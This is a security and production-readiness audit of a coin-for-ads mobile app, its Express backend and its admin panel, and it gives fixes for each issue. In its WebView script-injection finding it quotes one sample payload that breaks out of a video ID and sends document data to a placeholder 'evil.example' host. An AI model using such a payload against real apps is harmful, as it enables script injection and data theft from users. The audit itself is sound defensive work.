# Reel Flow — Full-Stack Production Readiness & Security Audit

**Scope:** `frontend` (React Native/Expo app), `backend` (Node/Express/Prisma API), `admin-panel` (React/Vite)
**Reviewed as:** Security Engineer, Full-Stack Engineer, Business/Product Owner, Behavioral/Psychology Reviewer, UI/UX & Design Reviewer
**Verdict up front:** The core coin-earning loop and Redeem flow ARE wired end-to-end now (this is real progress since the last audit). But there are **three Critical-severity issues** that will get you exploited, breached, or rejected from Play Store if shipped as-is, plus a stack of High/Medium issues. None of them are hard to fix — most are a few hours each — but they need to happen before a public listing.

---

## 0. TL;DR — Ship Blockers

| # | Issue | Why it matters | Effort to fix |
|---|---|---|---|
| 1 | Admin roles are not actually separated — `FRAUD_ANALYST` and `FINANCE_ADMIN` have the same power as `SUPER_ADMIN` over money | A support/fraud-review hire (or their stolen credentials) can mint unlimited coins, approve withdrawals, and rewrite ad economics | 1–2 hrs |
| 2 | Admin-uploaded YouTube video IDs are interpolated unsanitized into a WebView's inline `<script>` | A malicious/compromised admin (any of the 3 admin roles) can inject JS that runs in every user's app | 30 min |
| 3 | `trust proxy` is never set on Express, but the app runs behind Railway's proxy | Every fraud-detection, rate-limit, and audit-log IP is wrong (all users can look like one IP, or `express-rate-limit` throws/misbehaves) | 15 min |
| 4 | `withdrawalLimiter` is defined but never attached to `/api/wallet/withdraw` | Nothing stops rapid-fire withdrawal spam beyond the global 150 req/min fraud check | 5 min |
| 5 | The app's core model — real INR payouts for watching ads — sits in a Play Store policy gray zone | Real risk of listing rejection or takedown after launch if not pre-cleared | Policy review, not code |

Everything below goes into detail, organized by persona, then a consolidated fix list at the end.

---

## 1. Security Engineer Review

### 1.1 CRITICAL — Admin role separation is fake
**File:** `backend/src/routes/admin.ts` line 12, `backend/src/middlewares/authMiddleware.ts` line 40

```ts
router.use(authenticate, authorizeAdmin);   // applies to almost the entire admin router
...
const adminRoles = ['SUPER_ADMIN', 'FINANCE_ADMIN', 'FRAUD_ANALYST'];
```

Only `/admin/env` and `/admin/env` POST are gated behind `authorizeSuperAdmin`. Every other admin route — including `adjustUserBalance`, `processWithdrawal`, `updateAdRewardRule`, `updateDailyCapPolicy`, `sendNotification`, `uploadYoutubePool`, `updateConfig` — is reachable by **any** of the three roles. This means:

- `FRAUD_ANALYST` (a role that by name should only *read* fraud signals) can call `POST /admin/users/:id/balance` and credit itself or a colluding account unlimited coins.
- `FRAUD_ANALYST` can approve its own flagged withdrawals via `processWithdrawal`.
- `FRAUD_ANALYST`/`FINANCE_ADMIN` can rewrite `AdRewardRule.coinsAwarded` and `DailyCapPolicy.maxCoinsPerDay` to arbitrarily large numbers, effectively printing money through the legitimate reward path.
- `FRAUD_ANALYST`/`FINANCE_ADMIN` can push arbitrary push notifications to all users (`sendNotification`), and can upload YouTube pool entries (see 1.2).

**Fix:** Split `admin.ts` into three explicit tiers and apply the right guard per route — e.g. `authorizeFraudAnalyst` for read-only fraud/user-intelligence routes, `authorizeFinance` for withdrawals/balance adjustments, `authorizeSuperAdmin` for config, ad economics, and env. Don't rely on one blanket `authorizeAdmin` for a router with this much financial surface area.

### 1.2 CRITICAL — Unsanitized video ID → script injection in the Shorts WebView
**Files:** `frontend/src/components/shorts/ShortItem.tsx` (~line 330–360), `backend/src/controllers/configController.ts` `uploadYoutubePool` (line 190)

The player HTML is built as a template literal and handed to a `WebView` with `originWhitelist={['*']}`:

```ts
videoId: '${data.id}',
...
playlist: '${data.id}',
```

`data.id` ultimately comes from `YoutubeVideoPool.videoId`, and the admin bulk-upload endpoint does **no format validation** on it:

```ts
const cleanId = String(videoId || '').trim();
if (!cleanId) continue;
await prisma.youtubeVideoPool.create({ data: { videoId: cleanId, ... } });
```

Any string survives — there's no check against the real YouTube ID shape (`^[A-Za-z0-9_-]{11}$`). Combine this with finding 1.1 (any of three admin roles can call this endpoint) and you get: a lower-trust admin account (or one compromised via phishing/XSS on the admin panel) can store a value like `'}); fetch('https://evil.example/'+document... //` as a "video ID," and it will execute inside the WebView of every user who scrolls to that Short. Because `originWhitelist={['*']}` is also set, the WebView can additionally navigate anywhere, widening what that injected script can do.

**Fix (both sides, defense in depth):**
- Backend: validate `videoId` against `/^[A-Za-z0-9_-]{11}$/` in `uploadYoutubePool` before insert; reject anything else.
- Frontend: never string-interpolate untrusted data into inline `<script>`. Pass `data.id` via `postMessage`/`injectedJavaScriptBeforeContentLoaded` instead of template interpolation, or at minimum re-validate the 11-char shape client-side before building the HTML.
- Narrow `originWhitelist` to the exact origins you need (`https://www.youtube.com`, `https://s.ytimg.com`), not `['*']`.

### 1.3 CRITICAL — `trust proxy` not configured behind Railway
**File:** `backend/src/index.ts`

The app deploys on Railway (`railway.json` present) but never calls `app.set('trust proxy', ...)`. Nearly every piece of abuse logic in this codebase depends on knowing the real client IP:

- `fraudMiddleware.ts` — multi-account-per-IP detection, VPN/proxy heuristic, IP-based rate key
- `securityMiddleware.ts` — `express-rate-limit` (global, auth, withdrawal limiters)
- `ledgerService.ts` — `ipHash` stored on every coin ledger entry
- `walletController.ts` / `offerwall.ts` — IP recorded on every withdrawal/reward

Without `trust proxy`, Express's `req.ip` resolves to Railway's edge/proxy address, not the device's real IP — so every one of those systems is silently keying off the wrong value. Depending on how Railway proxies traffic, this can also make `express-rate-limit` v8 throw a validation error at request time (it explicitly checks for an `X-Forwarded-For` header showing up when `trust proxy` is `false`), which could 500 legitimate requests.

**Fix:** `app.set('trust proxy', 1)` (or Railway's documented hop count) before any rate limiter or IP-dependent middleware is registered.

### 1.4 HIGH — `withdrawalLimiter` is dead code
**Files:** `backend/src/middlewares/securityMiddleware.ts` (defines it), `backend/src/routes/wallet.ts` (never imports it)

```ts
export const withdrawalLimiter = rateLimit({ windowMs: 24h, max: 5, ... }); // defined, never used
```

`router.post('/withdraw', authenticate, requestWithdrawal);` — no rate limiter attached. The only backstop is the global 150 req/min fraud middleware and the Serializable transaction in `requestWithdrawal` itself (which does correctly prevent overdraft/double-spend — good engineering there). But nothing stops someone scripting dozens of small withdrawal *requests* per day to flood your manual-review queue.

**Fix:** `router.post('/withdraw', authenticate, withdrawalLimiter, requestWithdrawal);`

### 1.5 HIGH — Admin JWT stored in `localStorage`
**File:** `admin-panel/src/services/api.ts` line 10, `admin-panel/src/pages/AdminLogin.tsx` line 31

```ts
localStorage.setItem('adminToken', token);
```

Any XSS on the admin panel (or a malicious dependency in the React/Vite build chain) can read this token and exfiltrate it, and since this token grants the powers described in 1.1, that's a full account-and-money takeover. `localStorage` has no `httpOnly` protection by design.

**Fix:** For a SPA calling a separate API domain, this is a known hard tradeoff — the pragmatic fix is (a) keep the admin panel's dependency surface minimal and audited, (b) shorten the admin JWT's expiry well below the 30-day mobile-app expiry (a 30-day token for a panel that controls money is too long-lived), and (c) add a "recent admin action requires re-auth" step for the highest-risk actions (balance adjustment, withdrawal approval, env edit).

### 1.6 MEDIUM — `/admin/env` exposes and allows overwriting the entire production `.env`
**Files:** `backend/src/controllers/adminController.ts` `getEnvConfig`/`updateEnvConfig`, `admin-panel/src/pages/EnvConfig.tsx`

This is gated to `SUPER_ADMIN` only (correctly), but architecturally it's still a raw-secrets-in-a-browser-textarea feature: `DATABASE_URL`, `JWT_SECRET`, `API_CLIENT_SECRET`, `FIREBASE_SERVICE_ACCOUNT_JSON`/`_BASE64`, `REDIS_URL`, `YOUTUBE_API_KEY` all round-trip through the browser in plaintext. It does at least take a backup file and requires typing "OVERWRITE," which is a nice guardrail against fat-fingering — but it doesn't protect against a stolen SUPER_ADMIN session.

Two extra problems:
- **It likely doesn't work for a real `.env`.** `app.use(express.json({ limit: '10kb' }))` is global. A realistic production `.env` with a Firebase service-account JSON, all the AdMob unit IDs, and the rest of the keys documented below can plausibly exceed 10KB, in which case `POST /admin/env` will 413 before it reaches the handler. Test this with your actual file before relying on it.
- **Writing the file doesn't actually change the running process's `process.env`.** `updateEnvConfig` writes to disk but nothing re-reads it — you still need a restart, which the UI hints at but doesn't enforce, so an admin can "save" a change and reasonably assume it's live when it isn't yet.

**Fix:** Move secret management to your host's secret manager (Railway variables UI, or a dedicated secrets store) instead of a homegrown file editor. If you keep it, raise the JSON body limit for this route specifically and add a clear "not applied until restart" banner (the UI already has a soft version of this, make it a hard blocking notice).

### 1.7 MEDIUM — HMAC signature comparison isn't constant-time
**File:** `backend/src/middlewares/signatureMiddleware.ts` line 25

```ts
if (signature !== expectedSignature) { ... }
```

String `!==` comparison of an HMAC leaks timing information in theory (low real-world exploitability given network jitter, but it's a one-line fix). Use `crypto.timingSafeEqual` on `Buffer.from(signature)` vs `Buffer.from(expectedSignature)` (guard for length mismatch first, since `timingSafeEqual` throws on unequal lengths).

### 1.8 MEDIUM — JWT stored unencrypted in AsyncStorage on the client
**File:** `frontend/src/store/useAppStore.ts`

The 30-day JWT is persisted via `AsyncStorage` (unencrypted on-device key-value storage), while the app itself goes to real effort to detect rooted/emulator devices elsewhere (`deviceSafety.ts`, `fingerprintController.ts`). On a rooted device, AsyncStorage's underlying files are directly readable — the same threat model the app is defending against in the fraud system isn't applied to its own auth token.

**Fix:** Store the JWT in `expo-secure-store` (Keychain/Keystore-backed) instead of AsyncStorage. This is a drop-in swap for the persisted `token` field.

### 1.9 LOW/Informational
- `getSystemLogs` (`adminController.ts`) shells out via `execFile('tail', [...])`. This is done correctly — `execFile` with an argument array, not `exec`/string concatenation — so it is **not** command-injectable. Flagged only so you know it was checked; no action needed, though `fs.readFileSync` + `.split('\n').slice(-100)` would remove the child-process dependency entirely.
- `google-services.json` is committed to the repo and not gitignored. This is expected/by-design for Firebase Android apps (the file isn't a secret the way an API key with no restrictions would be), but confirm in the Google Cloud Console that the API key inside it is restricted to your Android package name + SHA-1 fingerprints so it can't be lifted and reused elsewhere.
- `eas.json`'s `production` build profile has no explicit `env` block — confirm your CI/EAS project-level env vars actually cover every `EXPO_PUBLIC_*` key `adUnits.ts` requires (`requiredAdUnit` throws at runtime if missing, which is good — better to crash a broken build than ship silently-wrong ad units — but verify this is caught in EAS build, not just discovered by a user).
- Root `test.js`, `test2.js`, `scratch.tsx` are scratch files sitting in the repo root — harmless but should not ship in the app bundle/repo. Delete before the next build.

---

## 2. Full-Stack / "Is it actually wired up" Review

Good news first: the things the earlier audit flagged as broken are now genuinely fixed.

- ✅ **Coin-earning loop is real.** `ShortsFeed.tsx` creates real `RewardedInterstitialAd`/`RewardedAd` instances, listens for `RewardedAdEventType.EARNED_REWARD`, and only then calls `claimAdReward(...)` against the backend, which independently re-validates caps/cooldowns/device flags server-side before crediting coins (`rewardsController.ts`). This is correctly server-authoritative — the client cannot just claim coins by faking a UI event, because the reward amount and eligibility are recomputed from `AdRewardRule`/`DailyCapPolicy` on the server, not trusted from the client.
- ✅ **Redeem button is wired.** `WalletScreen.handleRedeem` → `requestWithdrawal` → backend `requestWithdrawal` runs inside a `Serializable` Prisma transaction that debits the ledger, decrements stock, and creates the withdrawal row atomically — correct handling of the classic "double-redeem race condition."
- ✅ **Idempotency is handled properly** in `ledgerService.addLedgerEntry` via a unique `idempotencyKey`, and callers correctly catch Prisma's `P2002` (unique constraint violation) to return "already claimed" instead of erroring — this is exactly right for a reward system that will see retried requests from flaky mobile networks.
- ✅ **Shorts watching itself pays 0 coins** by design ("Option A: coins come from ads, not content watching" per the code comment) — this is a deliberate, sound anti-farming decision, not a bug.

### Now the wiring gaps:

**2.1 — Duplicate/dead route in `admin.ts`:**
```ts
router.get('/ad-placements', getAdPlacements);
router.post('/ad-placements', getAdPlacements); // POST for create  <-- comment lies
router.post('/ad-placements/create', createAdPlacement);
```
`POST /admin/ad-placements` is bound to the *read* handler, not `createAdPlacement`, despite the comment. It's harmless (returns a list instead of creating anything, doesn't corrupt data) but will confuse anyone integrating against it later, including your own admin panel if it's ever changed to call that URL instead of `/ad-placements/create`. Remove the stray line.

**2.2 — Withdrawal `payoutMethod` is trusted from the client instead of derived server-side:**
`walletController.requestWithdrawal` takes `payoutMethod` straight from `req.body` rather than reading it off the validated `catalogItem.type` it already loaded in the same transaction:
```ts
payoutMethod: String(payoutMethod).slice(0, 40),   // client-supplied
```
A user can request `catalogItemId: 3` (a real, valid UPI item) but send `payoutMethod: "PHYSICAL_GOLD_BAR"`. It doesn't let them steal money (the coin cost is still `item.coinCost`), but it pollutes your ops/finance data and could confuse whoever manually processes withdrawals in the admin panel. Use `item.type` instead of trusting the body field.

**2.3 — `express.json({ limit: '10kb' })` may silently break the env editor** — see 1.6 above; worth an explicit test before you rely on that admin feature.

**2.4 — No `.env.example` anywhere in the backend repo.** There's no single source of truth for what environment variables a fresh deploy needs (`JWT_SECRET`, `API_CLIENT_SECRET`, `DATABASE_URL`, `REDIS_URL`, `GOOGLE_CLIENT_ID`, `FIREBASE_SERVICE_ACCOUNT_JSON`/`_BASE64`, `YOUTUBE_API_KEY`, `CORS_ALLOWED_ORIGINS`, `MAX_OFFERWALL_REWARD_PER_CALL`, `PUBLIC_APP_URL`, `PORT`...). Only `JWT_SECRET`/`API_CLIENT_SECRET` are enforced at boot in production (`index.ts` lines 30–35); the rest fail lazily (e.g., Firebase throws at first use, not at startup). Add a `.env.example` and consider extending the boot-time check to cover Firebase and Redis too, so a misconfigured deploy fails fast at startup instead of on a user's first push notification or first ad claim.

**2.5 — No CI pipeline found** (no `.github/workflows`, no Dockerfile for the API itself — `docker-compose.yml` only stands up local Redis/Postgres/Prometheus/Grafana). For a production rewards app moving real money, at minimum add a CI step that runs `tsc --noEmit` and `prisma validate` on every push before Railway auto-deploys, so a broken build doesn't reach production.

**2.6 — `docker-compose.yml` Postgres uses hardcoded `postgres/postgres` credentials.** Fine for local dev (which is clearly its only purpose here, since prod uses Railway's `DATABASE_URL`), just confirm nobody ever points this compose file at a real environment.

---

## 3. Business / Product Review

### 3.1 The core business model is in Play Store's compliance gray zone — validate this *before* investing more build time
Reel Flow's model is: watch AdMob rewarded ads → earn coins → redeem coins for real INR via UPI. This category of app ("get paid to watch ads/complete tasks," redeemable for real cash) has faced repeated, well-documented enforcement action on Google Play under the **Deceptive Behavior**, **Financial Services**, and **Ads** policies — not because the concept is inherently banned, but because Google scrutinizes real-money-reward apps heavily for fraud/incentivized-install risk, and AdMob's own policies restrict "incentivizing" certain ad formats in certain ways. Two separate risk surfaces stack here:
1. **AdMob policy risk** on your own ad account — rewarded interstitials that auto-trigger without a clear opt-in (as one of your two Shorts placements does — `handleInterstitialTrigger` fires automatically on a scroll-interval basis, not from a user tap) sit closer to the line AdMob draws around "forced/non-opt-in" rewarded ad experiences. Your other placement (`handleVideoOptInTrigger`, a card the user taps) is the safer pattern. Worth a policy re-read before launch: https://support.google.com/admob/answer/6128543
2. **Play Store listing risk** for apps that pay real currency for engagement — Google has pulled multiple "GPT" (get-paid-to) apps in this category for policy reasons unrelated to code quality. Read Play's Financial Services and Deceptive Behavior policies specifically with this app in mind, and budget for the possibility of a rejection-and-appeal cycle at submission time, separate from any code fix.

This isn't a reason not to ship — plenty of apps in this space do operate on Play Store — but it's a business risk that needs a deliberate go/no-go decision from you, not a silent assumption that it'll sail through review.

### 3.2 Payouts are entirely manual, with no visible payment-processor integration
`Withdrawal` rows are created as `PENDING` and there is no Razorpay/Cashfree/UPI-payout API call anywhere in the codebase — an admin manually flips status to `APPROVED`/`REJECTED` in the panel, and presumably pays out UPI by hand outside the system. That's a completely reasonable way to run a beta with a few hundred users. It will not scale past that, and — more importantly — if you are directly facilitating money movement to users at any real volume, look into whether you need to route payouts through a licensed Payment Aggregator (RBI's PA/PG framework) rather than doing peer-style manual UPI transfers from a personal/business account. This is a "talk to a CA/fintech lawyer before you scale" item, not a code fix.

### 3.3 Fabricated social proof on the login screen
**File:** `frontend/src/screens/AuthScreen.tsx`
```tsx
<Text style={styles.statsText}>₹2.4M+ redeemed this month</Text>
```
This is a hardcoded literal, not data from your backend. If the app hasn't actually paid out ₹2.4M in a month, this is a fabricated claim shown to users before they've earned any trust with you — beyond the ethical issue, unverifiable financial claims are exactly the kind of thing that draws extra Play Store review scrutiny for an app already in a sensitive category (3.1). Replace with either a real, backend-sourced aggregate once you have honest numbers, or drop the claim entirely until then.

### 3.4 Referral payout tiers are configured but the "tier" field is never actually advanced
**File:** `backend/prisma/schema.prisma`, `referralController.ts`, `adminController.ts` line 147

`Referral.tier` defaults to `1` at creation and there is **no code path anywhere in the backend that ever updates it** (grep confirms `tier` is only read, never written after creation). But `processWithdrawal` pays referrers a bonus scaled by tier (`{1: 10%, 2: 15%, 3: 20%}`), and `referralController.getReferralStats` shows the user their "current tier" in the app. Functionally today, every referral is permanently stuck at Tier 1 (10%) — the 15%/20% escalation tiers you've modeled in the schema and paid out for in `adminController.ts` are unreachable dead logic. If the product intent is "refer more people, earn a higher %," that escalation simply doesn't happen right now. This is worth flagging to whoever owns the referral program design — either wire up the tier-advancement logic (e.g., in `updateStreak` or a scheduled job, based on referral count/activity) or simplify the copy/schema to match reality.

---

## 4. Psychological / Behavioral Design Review

This isn't a "these dark patterns are illegal" section — it's a "here's what's steering user behavior, be intentional about it" section, since you asked for this lens specifically.

- **Auto-triggered rewarded interstitials during scroll** (`ShortsFeed.handleInterstitialTrigger`) fire on an interval, not a tap. Functionally this behaves like a variable-ish interruption schedule layered on top of short-form video — the same mechanic that makes short-form feeds sticky is now also the ad-trigger. That's an effective monetization design, but combine it with genuine reward payouts and you're intentionally building a habit loop around a real-money outcome. Worth being deliberate about frequency caps (you already have `intervalMin`/`intervalMax`/`cooldownSeconds` in `AdPlacement` — good, that's the right lever) rather than tuning purely for revenue.
- **The fabricated "₹2.4M+ redeemed" stat (3.3)** is specifically a social-proof/scarcity-adjacent pattern aimed at new users before they have any first-hand basis to trust the app — this is the one item in this section that crosses from "effective design" into "manipulative if untrue," so it's flagged twice deliberately (business risk + trust risk).
- **Shadow-banning is implemented** (`shadowBanned` flag, silently prefixes ledger entries with `SHADOW_` instead of blocking the user outright) — this is a legitimate, common anti-fraud technique, but be aware of the user-facing consequence: a shadow-banned user keeps watching ads, keeps seeing a coin counter go up in the UI (their local `coinBalance` state updates from `claimAdReward`'s response, which doesn't distinguish shadow-banned status), and will eventually try to redeem and either get silently blocked or discover the coins "don't count." If a real user gets false-positive shadow-banned (the trigger is `riskScore > 80`, which includes the somewhat blunt "used same IP as 3+ other accounts" signal — plausible for shared home wifi/college hostel Wi-Fi in India), they experience this as the app quietly lying to them for days before they find out. Consider a softer UX for legitimate edge cases — e.g., a manual appeal path — rather than pure silent shadow-ban with no recourse.
- **Streak mechanics** (`expService.updateStreak`) use loss-framing correctly and honestly — "Streak Broken!" notification is truthful and immediate, not manipulative. No issue here, called out as a positive.

---

## 5. UI / Frontend / Design Review

I did not find major structural design problems in the components reviewed — the codebase shows real craft (spring-animated bottom nav, coin-rain celebration, shimmer loading states, a 3-slot WebView pool specifically built to kill scroll latency). Focused notes:

- **`SHOW_AUTHOR_INFO = false`** (`ShortItem.tsx`) is a hardcoded flag that hides username/avatar/caption/sound UI entirely — confirm this is an intentional current design decision and not a debugging leftover, since the underlying `ShortData` interface and UI code for that section are still fully built and just switched off.
- **Ad-format inconsistency between placements**: the auto-triggered interstitial and the tap-to-opt-in card look and feel different to the user (one interrupts, one is chosen) but both ultimately grant the same kind of reward — consider whether the *visual language* around "this is an ad, this is what you get" is equally clear in both paths, since interrupting placements need extra clarity that the user is about to see an ad (vs. an opt-in card where the framing is already explicit).
- **Admin panel (`EnvConfig.tsx`, `AdRewardRules.tsx`, etc.)** is functional and consistent (dark theme, Tailwind, lucide icons throughout) with good destructive-action friction on the env editor (type "OVERWRITE" to confirm) — genuinely good pattern, worth reusing on `adjustUserBalance` and `processWithdrawal` in the admin panel too, since those are equally high-stakes and currently don't appear to require a confirmation step in the UI layer (worth double-checking `Users.tsx`/`Withdrawals.tsx` directly if not already reviewed).
- Nothing resembling color-contrast or accessibility-blocking issues surfaced in the files reviewed, but a dedicated pass with a contrast checker on the dark-mode admin palette (`#111`/`#1A1A1A`/`#333` grays against colored text) is worth doing before considering the admin panel "done," since low-contrast dark themes are an easy miss.

---

## 6. Consolidated Fix List (priority order)

**Before any public Play Store submission:**
1. Split admin authorization by role — stop giving `FRAUD_ANALYST`/`FINANCE_ADMIN` blanket access to money-moving endpoints (§1.1)
2. Validate YouTube video IDs server-side and stop string-interpolating untrusted data into the WebView's inline script (§1.2)
3. Set `app.set('trust proxy', ...)` before rate limiters/fraud middleware (§1.3)
4. Wire `withdrawalLimiter` onto `/api/wallet/withdraw` (§1.4)
5. Get a real answer (from Play policy docs, or legal counsel familiar with Indian fintech/RMG-adjacent apps) on §3.1 and §3.2 before you spend more engineering time — this is the one item that could invalidate the whole submission regardless of code quality
6. Remove or replace the fabricated "₹2.4M+ redeemed" claim (§3.3)

**Before scaling past a small beta:**
7. Move JWT storage to `expo-secure-store` on the client (§1.8)
8. Shorten admin JWT expiry + reconsider `localStorage` for the admin token (§1.5)
9. Fix `payoutMethod` to derive from the catalog item, not client input (§2.2)
10. Decide whether referral tier escalation is a real feature or should be simplified out of the schema/UI (§3.4)
11. Add `.env.example` + expand boot-time secret validation to Firebase/Redis (§2.4)
12. Add a CI step (typecheck + prisma validate) gating deploys (§2.5)

**Nice-to-have hardening:**
13. `crypto.timingSafeEqual` for the offerwall HMAC check (§1.7)
14. Remove the dead `POST /ad-placements` route line (§2.1)
15. Confirm `express.json({limit:'10kb'})` doesn't break the real `.env` editor payload, or bump the limit for that one route (§1.6/§2.3)
16. Delete `test.js`, `test2.js`, `scratch.tsx` from the repo root

---

*This audit covered the code as provided and did not include a live penetration test, dependency CVE scan, or Play Store policy pre-check with Google directly — recommend both before final launch, especially the policy pre-check given §3.1.*
